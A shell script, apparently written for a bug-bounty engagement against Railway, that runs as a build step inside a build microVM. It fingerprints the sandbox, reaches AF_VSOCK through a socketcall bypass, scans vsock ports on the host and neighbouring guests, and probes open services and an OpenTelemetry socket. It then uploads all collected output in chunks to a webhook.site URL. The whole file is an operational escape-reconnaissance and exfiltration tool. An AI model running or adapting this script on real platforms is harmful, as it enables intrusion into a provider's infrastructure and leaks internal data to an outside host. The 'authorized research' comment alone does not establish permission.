#!/bin/sh
# laneD probe.sh — build container -> AF_VSOCK (socketcall bypass) -> build VM agent / host control plane
# Runs as a build step (buildCommand) inside the Railway build microVM. Authorized research (Bugcrowd/Railway).
D=laneD
OUT=/app/$D/results.txt
: > "$OUT"
W="https://webhook.site/b6e7624d-0d11-4b13-90a3-740120691ca4"

exfil() { curl -sS -m 30 -X POST "$W" -H "Content-Type: text/plain" --data-binary @"$1" >/dev/null 2>&1; echo "exfil:$1 rc=$?"; }

log() { echo "$@" | tee -a "$OUT"; }

log "###LANED-START### $(date -u) host=$(hostname) uid=$(id -u) pid1=$(cat /proc/1/cmdline 2>/dev/null | tr '\0' ' ')"

# ---------- D0 fingerprint ----------
{
  echo "=== /proc/version ==="; cat /proc/version
  echo "=== uname ==="; uname -a
  echo "=== /proc/1/cgroup ==="; cat /proc/1/cgroup
  echo "=== /proc/self/cgroup ==="; cat /proc/self/cgroup
  echo "=== caps/seccomp ==="; grep -E 'Cap|Seccomp|NoNewPrivs' /proc/self/status
  echo "=== attr/current ==="; cat /proc/self/attr/current 2>&1
  echo "=== uid_map ==="; cat /proc/self/uid_map
  echo "=== /dev ==="; ls -la /dev
  echo "=== /proc/net/unix ==="; cat /proc/net/unix
  echo "=== /proc/net/vsock ==="; ls -la /proc/net/vsock 2>&1; cat /proc/net/vsock 2>&1
  echo "=== /sys/class/vsock ==="; ls -la /sys/class/vsock 2>&1
  echo "=== virtio vsock driver ==="; ls -la /sys/bus/virtio/drivers/vsock 2>&1
  echo "=== vsock module ==="; ls /sys/module/vsock 2>&1
  echo "=== mountinfo vsock/buildkit/otel ==="; grep -E 'vsock|buildkit|otel' /proc/self/mountinfo
  echo "=== dmesg tail ==="; dmesg 2>&1 | tail -2
  echo "=== ps ==="; ps aux 2>&1 | head -20
} >> "$OUT" 2>&1

# ---------- D1 direct AF_VSOCK + mknod CID ----------
python3 "$D/direct_vsock.py" >> "$OUT" 2>&1

# ---------- D2 socketcall bypass ----------
chmod +x "$D/vsock32" 2>/dev/null
echo "=== build vsock32 from source (check toolchain) ===" >> "$OUT"
if gcc -m32 -nostdlib -static -no-pie -fno-pie -fno-stack-protector -fno-builtin -Os -o "$D/vsock32_built" "$D/vsock32.c" >> "$OUT" 2>&1; then
  echo "BUILD32_OK" >> "$OUT"; VS="$D/vsock32_built"
else
  echo "BUILD32_FAIL (using prebuilt)" >> "$OUT"; VS="$D/vsock32"
fi
echo "VS=$VS" >> "$OUT"

NODE=$(command -v node 2>/dev/null)
[ -z "$NODE" ] && NODE=/mise/installs/node/24.21.0/bin/node
echo "NODE=$NODE" >> "$OUT"

echo "=== localcid ===" >> "$OUT"
$VS localcid >> "$OUT" 2>&1
LCID=$(grep -o 'LOCAL_CID=[0-9-]*' "$OUT" | tail -1 | cut -d= -f2)

echo "=== scan cid1 (vsock loopback) ports 1-12000 ===" >> "$OUT"
timeout 240 $VS scanrange 1 1 12000 >> "$OUT" 2>&1
echo "=== scan cid2 (host) ports 1-12000 ===" >> "$OUT"
timeout 240 $VS scanrange 2 1 12000 >> "$OUT" 2>&1
if [ -n "$LCID" ] && [ "$LCID" != "-1" ]; then
  echo "=== scan own cid $LCID ports 1-12000 ===" >> "$OUT"
  timeout 240 $VS scanrange "$LCID" 1 12000 >> "$OUT" 2>&1
fi
for c in 3 4 5; do
  for p in 1024 3000 4000; do
    $VS scan "$c" "$p" >> "$OUT" 2>&1
  done
done

# ---------- D3 probe open vsock ports with node h2/gRPC ----------
echo "=== OPEN list ===" >> "$OUT"
grep '^OPEN' "$OUT" | sort -u >> "$OUT"
grep '^OPEN' "$OUT" | sort -u | head -20 | while read -r line; do
  c=$(echo "$line" | sed 's/.*cid=\([0-9]*\).*/\1/')
  p=$(echo "$line" | sed 's/.*port=\([0-9]*\).*/\1/')
  echo "--- vsock probe cid=$c port=$p ---" >> "$OUT"
  timeout 90 $VS call "$c" "$p" "$NODE" "$D/vsock_probe.js" >> "$OUT" 2>&1
  echo "--- end cid=$c port=$p ---" >> "$OUT"
done

# ---------- D4 otel unix socket service probes ----------
echo "=== otel-grpc.sock probes ===" >> "$OUT"
timeout 90 "$NODE" "$D/otel_probe2.js" >> "$OUT" 2>&1

log "###LANED-END###"
cd /app/$D || exit 0
split -b 1500k results.txt chunk_ 2>/dev/null
for f in results.txt chunk_*; do
  [ -f "$f" ] && exfil "/app/$D/$f"
done
echo "###LANED-EXFIL-DONE###"
